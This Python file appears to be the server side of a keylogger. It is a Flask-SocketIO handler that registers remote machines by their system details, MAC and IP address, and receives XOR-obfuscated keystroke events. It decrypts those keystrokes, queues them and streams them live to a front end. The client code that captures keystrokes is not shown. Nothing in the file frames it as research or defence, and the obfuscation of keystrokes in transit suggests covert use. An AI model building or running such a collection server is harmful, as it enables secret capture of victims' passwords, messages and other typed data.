import logging
from multiprocessing.queues import Queue

from flask import request
from flask_socketio import SocketIO

from backend.data.database_manager import database_manager
from shared.Encriptor import XorCharCipher

cipher = XorCharCipher(77)


def register_socket_handlers(sio: SocketIO, event_queue: Queue):
    @sio.on('connect')
    def handle_connect(auth):

        if not auth:
            # Front end connected
            print("Front end connected.")
            return

        exists = database_manager.machine_repo.get_machine_by_username(auth)
        if exists:
            logging.info(f'Machine {exists["display_username"]} exist.')
            database_manager.machine_repo.set_status(auth, True)
            return

        processor = request.headers.get('Processor')
        machine_username = request.headers.get('Username')
        system = request.headers.get('System')
        node = request.headers.get('Node')
        release = request.headers.get('Release')
        version = request.headers.get('Version')
        machine = request.headers.get('Machine')
        mac_address = request.headers.get("Mac-Address")
        ip_address = request.remote_addr
        machine_id = database_manager.machine_repo.create_machine(auth, {
            'version': version,
            'system': system,
            'node': node,
            'machine': machine,
            'ip_address': ip_address,
            'release': release,
            'processor': processor,
            'mac_address': mac_address,
            'username': machine_username,
        })

        if machine_id:
            logging.info("New connection:", machine_id, auth, ip_address)

    @sio.on('disconnect')
    def handle_disconnect():
        username = request.headers.get("Display-Username")

        if username:
            logging.info("Client disconnected:", username)
            database_manager.machine_repo.set_status(username, False)
            logging.info("Connection closed:", username)

    @sio.on('ev')
    def handle_event(message):
        username = message.get("username")
        timestamp = message.get('timestamp')

        try:
            keystroke = cipher.decrypt_char(message.get('event'))
        except TypeError:
            return

        if username:
            payload = {
                'username': username,
                'keystroke': keystroke,
                'timestamp': timestamp
            }
            event_queue.put(payload)

            # logging.info(f"Keystroke {keystroke} got from {username}.")

            sio.emit('front-ev', payload)
